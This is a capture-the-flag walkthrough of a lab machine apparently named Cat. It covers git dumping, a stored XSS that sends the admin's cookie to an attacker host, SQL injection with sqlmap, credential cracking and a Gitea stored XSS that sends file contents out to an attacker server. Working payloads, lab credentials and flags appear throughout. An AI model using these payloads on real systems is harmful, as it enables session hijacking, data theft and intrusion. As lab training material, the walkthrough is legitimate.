We need to add `cat.htb` to `/etc/hosts`:

```
echo 'IP cat.htb' | sudo tee -a /etc/hosts
```

On the nmap scan, it said `.git` was enabled, we can try using `GitHack` to get the contents of the `.git` directory:

```
Repository: https://github.com/lijiejie/GitHack
```


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415175041.png)

We got a few files, if we check `admin.php`, we can see this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415175131.png)


We found there's an user called `axel`, he may be the administrator of the web application, let's proceed with the web stuff then:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415175512.png)

We can register in here, since we already have the source code of `login.php`, we can do an analysis of it:

```js
// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check->execute([':username' => $username, ':email' => $email]);
    $existing_user = $stmt_check->fetch(PDO::FETCH_ASSOC);

    if ($existing_user) {
        $error_message = "Error: Username or email already exists.";
    } else {
        $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
        $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);

        if ($stmt_insert) {
            $success_message = "Registration successful!";
        } else {
            $error_message = "Error: Unable to register user.";
        }
    }
}
```

This is where the magic relies, this is vulnerable to XSS, The vulnerable code is in the registration handling where the `username` parameter is directly taken from the user input (`$_GET['username']`) and stored in the database **without sanitization**.

```js
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username']; //No sanitization here
```

This allows an attacker to inject malicious scripts into the `username` field, which will execute when the username is later displayed on a page that renders it without proper escaping. This means we can try creating a test account to steal the admin's cookie.

Let's begin exploitation.


# EXPLOITATION
---

We can create a malicious username:


```
<script>document.location='http://10.10.15.39:8000/?c='+document.cookie;</script>
```




![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180441.png)


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180114.png)

Ok, registration went through, we can search for a way to exploit this, once we login, we can see that the `contest.php` page, seems suspicious:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180212.png)

We can send in some random data and check if the server is processing our username as code, we can maybe get the admin cookie based on the script we used on our username:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180304.png)



![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180517.png)


There we go, since it's been put into inspection, we know someone may be surveilling the data, most probably being the admin, if we check our python server, we can see this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415182450.png)

Nice, we got the cookie, since we got the source code of the files, I analyzed all of them and found this SQLI on `accept_cat.php`:

```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>

```

The following lines directly inserts the data to the database without a proper sanitization:

```php
if (isset($_POST['catId']) && isset($_POST['catName'])) {
    $cat_name = $_POST['catName'];
    $catId = $_POST['catId'];
    $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
    $pdo->exec($sql_insert);
```


Our vulnerable parameter is `catName`, we can use `sqlmap` in the following way knowing all this:

```
sqlmap -u "http://cat.htb/accept_cat.php" --data "catId=1&catName=catty" --cookie="PHPSESSID=801vfm5g8gtq70mcf4aosm7iov" -p catName --level=5 --risk=3 --dbms=SQLite --technique=B -T "users" --threads=4 --dump
```

If we check the output we can notice this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416123555.png)

So, we got an username `rosa`, and a hash, let's crack the hash:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416123641.png)

We got credentials:

```
rosa:soyunaprincesarosa
```


Let's go into ssh:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416123724.png)

Let's begin privilege escalation.



# PRIVILEGE ESCALATION
---


We can use `linpeas` to check for a PE vector:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416124804.png)

We can see `access.log` is here, let's read it:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416124841.png)

There we go, we got `axel` password:

```
axel:aNdZwgC4tI9gnVXv_e3Q
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416124915.png)

We can now read `user.txt`:

```
axel@cat:~$ cat user.txt
5ec867721c1897b5f2cd1d8baa25dcd4
```

If we log into ssh using `axel` credentials, we can notice this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416125949.png)

There's a message saying we have mail, we can check the contents of `/var/mail/axel`:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130053.png)

It says there's a web application running on port 3000, we can use port forwarding to check the contents of it:

```
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130234.png)

This is running `gitea 1.22.0`, we can log in using `axel` credentials, if we dig around, we can notice this:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130340.png)

Admin user is on here, seems like we can exploit this to get root access, let's search for an exploit:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130417.png)

```
## Vulnerability Description
Gitea 1.22.0 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. This vulnerability allows an attacker to inject malicious scripts that get stored on the server and executed in the context of another user's session.

## Steps to Reproduce
1. Log in to the application.
2. Create a new repository or modify an existing repository by clicking the Settings button from the `$username/$repo_name/settings` endpoint.
3. In the Description field, input the following payload:

    <a href=javascript:alert()>XSS test</a>

4. Save the changes.
5. Upon clicking the repository description, the payload was successfully injected in the Description field. By clicking on the message, an alert box will appear, indicating the execution of the injected script.
```

Nice, we can reproduce these steps, let's craft a more advanced payload to grab sensitive data from the server, for example, we can use this to grab the contents of `index.php`:

```js
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.15.39:8000/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSS test</a>
```

In order to make this work, we need to create a repository:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130652.png)

And we need to use the payload at the `description` field:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132041.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132052.png)


Once we create the repository, we can send an email back to the administrator which in this case is `jobert`, let's send it like this:

```
echo -e "http://localhost:3000/axel/REPO-NAME" | sendmail jobert@localhost
```

We need to have our python server ready before sending the email, once we send it, we can check this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132139.png)

Let's decode the data:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132217.png)

There we go, we got credentials for root:

```
root:IKw75eR0MR7CMIxhH0
```

Let's switch to root:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132330.png)

Now we can read `root.txt` and finish:

```
root@cat:/home/axel# cat /root/root.txt
d22c2ea311a3f638c4dbae4cca596120
```
